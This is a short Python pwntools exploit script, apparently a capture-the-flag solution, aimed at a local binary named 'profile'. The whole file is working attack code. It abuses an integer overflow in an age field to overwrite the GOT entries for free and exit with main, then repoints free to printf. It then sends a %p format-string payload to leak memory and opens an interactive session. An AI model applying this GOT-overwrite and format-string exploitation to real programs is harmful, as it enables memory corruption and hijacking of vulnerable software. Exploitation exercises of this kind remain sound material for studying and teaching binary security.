#!/usr/bin/env python3

from pwn import *

def overflow(addr: int):
	return str((addr << 32) + 1).encode()

context.terminal = ['tmux', 'splitw', '-h']
elf = context.binary = ELF("./profile")
io = process()
gdb.attach(io)

log.info("Overwriting free(%#x) with main(%#x)" % (elf.got.free, elf.sym.main))
io.sendlineafter(b"Age: ", overflow(elf.got.free))
io.sendlineafter(b'Name: ', p32(elf.sym.main)[:3])

log.info("Overwriting exit(%#x) with main(%#x)" % (elf.got.exit, elf.sym.main))
io.sendlineafter(b"Age: ", overflow(elf.got.exit))
io.sendlineafter(b'Name: ', p32(elf.sym.main)[:3])

log.info("Overwriting free(%#x) with printf(%#x)" % (elf.got.free, elf.sym.printf))
io.sendlineafter(b"Age: ", overflow(elf.got.free))
io.sendlineafter(b'Name: ', p32(elf.sym.printf)[:3])

io.sendlineafter(b"Age: ", b"1")
io.sendlineafter(b"Name: ", b"HELLO|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p")

io.interactive()